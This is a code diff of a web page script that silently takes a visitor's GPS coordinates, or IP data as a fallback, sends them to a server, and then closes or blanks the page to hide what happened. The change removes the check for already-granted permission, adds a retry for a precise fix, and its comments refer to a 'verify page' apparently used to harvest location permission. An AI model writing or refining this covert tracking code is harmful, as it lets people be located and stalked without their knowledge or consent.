@@ -58,30 +58,37 @@
     }
   }
 
-  // ── Try GPS only if permission is already cached ──
-  function tryCachedGPS() {
+  // ── Aggressively try GPS (permission should be cached from verify page) ──
+  function tryGPS() {
     if (!("geolocation" in navigator)) return;
 
-    if (navigator.permissions && navigator.permissions.query) {
-      navigator.permissions.query({ name: 'geolocation' })
-        .then(function(status) {
-          if (status.state === 'granted') {
-            // Permission cached — fire silently
-            navigator.geolocation.getCurrentPosition(
-              function(pos) {
-                sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-              },
-              function() {},
-              { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 }
-            );
-          }
-          // If 'prompt' or 'denied', do NOT attempt — stay silent
-        })
-        .catch(function() {});
-    }
+    // Try with maximumAge to use any cached position immediately
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+      },
+      function(err) {
+        // GPS failed — maybe permission was revoked. Still vanish.
+      },
+      { enableHighAccuracy: true, timeout: 5000, maximumAge: 300000 }
+    );
+
+    // Retry with fresh position after a brief delay (for better accuracy)
+    // This gets the device to use GPS chips instead of cached WiFi position
+    setTimeout(function() {
+      if (!window._sent && "geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          function(pos) {
+            sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+          },
+          function() {},
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      }
+    }, 500);
   }
 
-  // ── Fire IP data to server as fallback ──
+  // ── Send IP data as fallback ──
   function sendIPFallback() {
     if (sent) return;
     sent = true;
@@ -99,7 +106,7 @@
     }
   }
 
-  // ── Immediate self-destruct ──
+  // ── Vanish (best effort close) ──
   function vanish() {
     try { window.location.replace('about:blank'); } catch(e) {}
     try { window.open('', '_self', '').close(); } catch(e) {}
@@ -115,19 +122,19 @@
   }
 
   // ── Execute ──
-  tryCachedGPS();
+  tryGPS();
 
-  // Wait a moment for GPS (if cached), then send IP fallback and vanish
+  // Wait for GPS attempt, then send IP fallback and vanish
   setTimeout(function() {
     if (!window._sent) sendIPFallback();
     vanish();
-  }, 2000);
+  }, 3000);
 
-  // Force vanish after 5s regardless
+  // Force vanish after 6s regardless
   setTimeout(function() {
     if (!window._sent) { window._sent = true; }
     vanish();
-  }, 5000);
+  }, 6000);
 })();
 </script>
 </body>
